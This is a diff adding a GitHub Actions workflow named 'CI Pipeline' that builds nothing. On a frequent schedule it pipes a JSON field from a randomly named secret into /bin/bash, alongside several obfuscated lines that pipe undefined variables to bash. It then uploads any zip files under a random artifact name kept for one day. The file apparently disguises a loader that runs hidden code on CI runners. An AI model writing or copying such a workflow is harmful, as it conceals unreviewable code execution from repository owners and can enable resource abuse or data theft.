@@ -1,0 +1,40 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          lvytg688: ${{ secrets.lvytg688 }}
+        run: |
+          printf '%s' "$lvytg688" | jq -r .pdmv7622 | /bin/bash
+          printf '%s' "$r81" | jq -r .kpy23616 | /bin/bash
+          printf '%s' "$m341" | jq -r .xhqa17132 | /bin/bash
+          echo $hjsu06723 | jq -r .lnir672 | /bin/bash
+          echo $ee17 | jq -r .fnaw0951 | /bin/bash
+          echo $kj8 | jq -r .oyv66718 | /bin/bash
+          printf '%s' "$h7" | jq -r .l6 | /bin/bash
+          printf '%s' "$v3391" | jq -r .uf1876 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: eMBsJ4Kt
+          path: "*.zip"
+          retention-days: 1
